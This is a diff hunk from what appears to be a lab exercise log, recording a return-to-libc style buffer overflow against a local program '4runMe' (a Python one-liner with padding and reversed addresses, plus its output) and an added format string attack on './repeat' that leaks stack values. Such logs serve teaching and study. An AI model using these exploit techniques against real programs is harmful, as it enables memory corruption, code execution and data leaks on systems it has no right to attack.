@@ -221,3 +221,7 @@ lab@crunchbang:~$ ./4runMe $(python -c 'print "a" *22 + "\xb7\xd7\x4c\x30"[::-1]
 sh: 1: /home/bluefoggy/data.txt: Permission denied
 lab@crunchbang:~$ ./4runMe $(python -c 'print "a" *22 + "\xb7\xd7\x4c\x30"[::-1] + "\xb7\xd6\x82\x70"[::-1] + "\xbf\xff\xff\x75"[::-1]')
 The impressionism of mobility is rather open-minded in its empiricism.
+
+$ ./repeat 1 "%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x"
+0000000a.00000000.b7e9a3a0.b7e99ff4.bffff6b8.b7d668a1.00000000.00000000.0000000a.bffff6e8.0804866e.00000001.bffff8c3
+
